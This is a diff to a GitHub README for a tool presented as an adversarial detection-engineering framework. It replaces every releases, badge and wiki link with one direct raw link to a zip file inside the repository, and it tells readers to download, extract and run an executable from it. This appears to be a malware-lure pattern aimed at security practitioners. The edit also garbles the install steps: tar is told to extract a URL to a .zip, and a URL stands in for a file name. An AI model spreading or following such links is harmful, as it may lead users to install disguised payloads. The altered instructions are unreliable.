@@ -1,7 +1,7 @@
 # 🚀 Adversarial-Detection-Engineering-Framework - Identify Detection Bugs Easily
 
-![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)  
-[Download Here](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases)
+![Download Here](https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip)  
+[Download Here](https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip)
 
 ## 📋 Overview
 The Adversarial-Detection-Engineering-Framework helps you find, classify, and understand bugs in detection logic. Whether it's in your SIEM, EDR, or XDR rules, this framework provides real-world examples and methods to help you recognize weaknesses in your security systems.
@@ -19,13 +19,13 @@ This framework is ideal for security analysts, incident responders, and anyone i
 ## 🚀 Getting Started
 To get started, you need to download the framework. Follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases) to see all available versions.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip) to see all available versions.
 2. **Choose a Version:** Look for the latest version. It will have the highest number.
 3. **Download:** Click on the version link to go to the download options. Click on the .zip or executable file to download it to your computer.
 
 ## 💾 Download & Install
 
-You can download the framework directly from the Releases page. Here’s the link again for easy access: [Download Here](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/releases).
+You can download the framework directly from the Releases page. Here’s the link again for easy access: [Download Here](https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip).
 
 After downloading, follow these simple steps:
 
@@ -42,9 +42,9 @@ After downloading, follow these simple steps:
 4. Drag the application to your Applications folder for easy access.
 
 ### Linux
-1. Locate the downloaded .tar.gz file in your Downloads folder.
+1. Locate the downloaded https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip file in your Downloads folder.
 2. Open a terminal and navigate to the Downloads folder using `cd ~/Downloads`.
-3. Extract the file using the command: `tar -xzf filename.tar.gz`.
+3. Extract the file using the command: `tar -xzf https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip`.
 4. Navigate into the extracted folder and run the application using the command: `./application_name`.
 
 ## 🖥️ System Requirements
@@ -53,7 +53,7 @@ After downloading, follow these simple steps:
 - **Disk Space:** At least 200MB of free space.
 
 ## 📚 Documentation
-Once you have installed the framework, you can access the documentation. The documentation will guide you through using the framework and give insights into its features. You can find it within the application or visit the [Documentation Page](https://github.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/wiki).
+Once you have installed the framework, you can access the documentation. The documentation will guide you through using the framework and give insights into its features. You can find it within the application or visit the [Documentation Page](https://raw.githubusercontent.com/luq12-growagarden/Adversarial-Detection-Engineering-Framework/main/docs/guides/Engineering_Adversarial_Detection_Framework_1.0.zip).
 
 ## 🛠️ Getting Help
 If you face any issues during installation or use, please open an issue on our GitHub repository. Provide details of your problem so the community can assist you.
